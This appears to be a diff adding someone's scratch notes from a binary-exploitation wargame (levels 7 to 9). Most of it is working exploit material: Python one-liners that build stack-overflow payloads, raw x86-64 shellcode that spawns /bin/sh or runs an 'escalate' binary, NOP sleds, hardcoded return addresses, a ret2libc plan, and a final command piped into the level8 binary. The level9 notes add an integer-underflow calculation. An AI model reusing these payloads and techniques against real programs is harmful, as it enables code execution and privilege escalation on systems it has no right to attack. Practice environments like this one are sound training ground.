@@ -1,0 +1,71 @@
+run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"/bin/sh" + b"A"*93 + b"\x24\xe2\xff\xff\xff\x7f\x00\x00")')
+
+set follow-fork-mode child
+
+run < <(python3 -c 'import sys; sys.stdout.buffer.write(b"0\n" + b"A"*40 + b"\x24\xe2\xff\xff\xff\x7f\x00\x00" + b"\nescalate")'; cat)
+
+(python3 -c 'import sys; sys.stdout.buffer.write(b"0\n" + b"A"*40 + b"\x24\xe2\xff\xff\xff\x7f\x00\x00" + b"id; escalate; /bin/sh\n")'; cat) | ./level7
+
+0x0000555555555429
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+python3 -c 'import sys; sys.stdout.buffer.write(120 * b"A" + b"\x50\x87\xc5\xf7\xff\x7f\x00\x00" + 8 * b"B" + b"")'
+
+system address: 0x7ffff7c58750
+"/bin/sh" address: 0x7ffff7dcb42f
+rbp in gdb: 0x7fffffffe230 (NOTE: changes sometimes)
+buffer beginning address: 0x7fffffffe1c0 (112 offset from rbp)
+
+injection changes first byte to 0x00 for some reason so gotta jump one to the right
+
+shell: python3 -c 'import sys; sys.stdout.buffer.write(1 * b"\x90" + b"\x48\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3b\x58\x99\x0f\x05" + 96 * b"A" + b"\xc1\xe1\xff\xff\xff\x7f\x00\x00" + b"\n2")'
+
+escalate: python3 -c 'import sys; 
+initial_padding = 0 * b"A"
+shellcode = b"\x90\x48\x81\xec\x00\x01\x00\x00\x90\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x6a\x3b\x58\x48\x31\xf6\x56\x48\xbb\x65\x73\x63\x61\x6c\x61\x74\x65\x53\x48\xbb\x63\x61\x6c\x2f\x62\x69\x6e\x2f\x53\x48\xbb\x2f\x75\x73\x72\x2f\x6c\x6f\x2f\x53\x48\x89\xe1\x52\x51\x57\x48\x89\xe6\x48\x31\xd2\x0f\x05"
+final_padding = 48 * b"A"
+return_address = b"\xc1\xe1\xff\xff\xff\x7f\x00\x00"
+number_input = b"\n2"   
+sys.stdout.buffer.write(initial_padding + shellcode + final_padding + return_address + number_input)'
+
+0x0000555555555255
+
+\x50\x87\xc5\xf7\xff\x7f\x00\x00
+
+rbp: 0x7fffffffe230
+buffer: 0x7fffffffe1c0 (112 offset from rbp)
+
+escalate:
+run <<< $(python3 -c 'import sys; 
+nop_sled = 20 * b"\x90"
+shellcode = b"\x48\x83\xc4\x80\x48\x31\xd2\x52\x48\xbb\x65\x73\x63\x61\x6c\x61\x74\x65\x53\x48\xbb\x61\x6c\x2f\x62\x69\x6e\x2f\x2f\x53\x48\xbb\x2f\x75\x73\x72\x2f\x6c\x6f\x63\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+padding = b"A" * (120 - len(nop_sled) - len(shellcode))                                                    
+shot_at_nop_sled = b"\xc0\xe1\xff\xff\xff\x7f\x00\x00"
+number_input = b"\n2"   
+sys.stdout.buffer.write(nop_sled + shellcode + padding + shot_at_nop_sled + number_input)')
+
+
+address that worked: 0x00007fffffffe040
+
+FINAL COMMAND:
+(python3 -c 'import sys; nop_sled = 40 * b"\x90"; shellcode = b"\x48\x83\xc4\xb0\x48\x31\xd2\x52\x48\xbb\x65\x73\x63\x61\x6c\x61\x74\x65\x53\x48\xbb\x61\x6c\x2f\x62\x69\x6e\x2f\x2f\x53\x48\xbb\x2f\x75\x73\x72\x2f\x6c\x6f\x63\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"; padding = b"A" * (120 - len(nop_sled) - len(shellcode)); shot_at_nop_sled = b"\x40\xe0\xff\xff\xff\x7f\x00\x00"; number_input = b"\n2"; sys.stdout.buffer.write(nop_sled + shellcode + padding + shot_at_nop_sled + number_input)') | /levels/level8/level8
+
+level9:
+array for 32 ints = 32 * 4 = 128 bytes
+
+wanna write 128 + 8 + 8 = 144 bytes to get to include return address 
+short is 2 bytes => max value is 65535 
+we have to give -x such that we get 144 / 4 = 36  with underflow and thus put 36 integers in
+
+(65535 + 1) + x = 36
+x = 36 - 65536 = 65500
+
+
+
+end of main break address: 0x0000555555555307
+
+buffer seems to start $rbp - 0x90 -> 144 bytes
+
+152 till return address in gdb
+
+rdb base pointer: 0x7fffffffe230
+buffer beginning address: rbp - 0x90 = 0x7fffffffe1a0
